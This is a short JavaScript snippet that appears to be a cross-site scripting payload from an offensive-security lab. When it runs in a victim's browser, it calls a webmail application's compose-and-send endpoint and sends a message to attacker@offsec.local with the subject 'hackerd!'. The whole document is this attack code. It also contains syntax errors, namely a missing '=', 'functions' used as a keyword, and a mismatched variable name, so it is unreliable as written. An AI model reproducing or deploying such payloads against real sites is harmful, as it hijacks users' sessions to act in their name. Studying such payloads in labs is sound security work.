var mail = "attacker@offsec.local";
var subject "hackerd!";
var message = "Este es un mensaje de prueba";

functions send_mail()
{
    var uri = "/index.php/mail/composemessage/send/tabId/viewmessageTab1";
    var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;

    xhr = new XMLHttpRequest();
    xhr.open("GET", uri + query_string, true);
    xhr.send(null);
}

send_mail();
